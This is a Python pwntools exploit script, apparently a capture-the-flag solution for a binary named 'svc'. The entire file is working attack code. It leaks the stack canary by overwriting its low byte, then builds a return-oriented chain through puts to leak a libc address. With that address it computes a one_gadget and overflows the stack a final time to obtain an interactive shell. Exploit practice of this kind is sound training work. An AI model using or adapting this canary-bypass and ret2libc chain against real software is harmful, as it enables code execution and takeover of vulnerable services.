from pwn import *

# Template - Context, Binary, Libc
context.terminal = ['tmux','splitw' ,'-h']
binary = ELF('./svc')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
env = {'LD_PRELOAD':'/lib/x86_64-linux-gnu/libc.so.6'}

p = process('./svc', env=env)
#p = gdb.debug('./svc', '''
#break *0x400a96
#break *0x400d7b
#break *0x400dc5''', env=env) # 0x400dc4 - stack_check_fail()


# Stack Canary Leak
def canary():
    global leaked_canary

    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('>>')

    # Overwrite LSB of Stack Cookie @ 169 offset.
    canary_payload = ''
    canary_payload += 'A' * 168
    canary_payload += 'B' * 1

    # If using 'p.sendline()' then it'll break stack canary with '\n'. (\x0a)
    p.send(canary_payload)

    # Reveal leaked stack cookie
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil('AB')
    canaryleak = p.recv(7)
    leaked_canary = u64('\x00' + canaryleak)
    print 'Canary: ', hex(leaked_canary)


# Leak libc address
def libc_leak():

    global pop_rsi
    global one_gadget

    main = 0x400a96
    pop_rdi = 0x400ea3
    pop_rsi = 0x400ea1    # pop rsi; pop r15; ret
    puts_plt = 0x4008d0
    puts_got = 0x602018


    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('>>')

    # Overflow stack using leaked stack cookie.
    # leak puts_got (libc puts address) using puts_plt.
    payload = ''
    payload += 'A' * 168
    payload += p64(leaked_canary)
    payload += 'C' * 8
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main)

    p.send(payload)

    p.recvuntil('>>')
    p.sendline('3')

    p.recvuntil('[*]BYE ~ TIME TO MINE MIENRALS...\n')
    leak = int(p.recv(6)[::-1].encode('hex'),16)
    libc_base = leak - libc.symbols['puts']
    one_gadget = libc_base + 0xcbcc0

    print 'libc leak: ', hex(leak)
    print 'libc base: ', hex(libc_base)

# Use leaked information to execute successful payload.
def exploit():
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('>>')

    payload2 = ''
    payload2 += 'A' * 168
    payload2 += p64(leaked_canary)
    payload2 += 'C' * 8
    payload2 += p64(pop_rsi)
    payload2 += p64(0x0)
    payload2 += p64(0x0)
    payload2 += p64(one_gadget)

    p.sendline(payload2)

    p.recvuntil('>>')
    p.sendline('3')
    p.interactive()


canary()
libc_leak()
exploit()
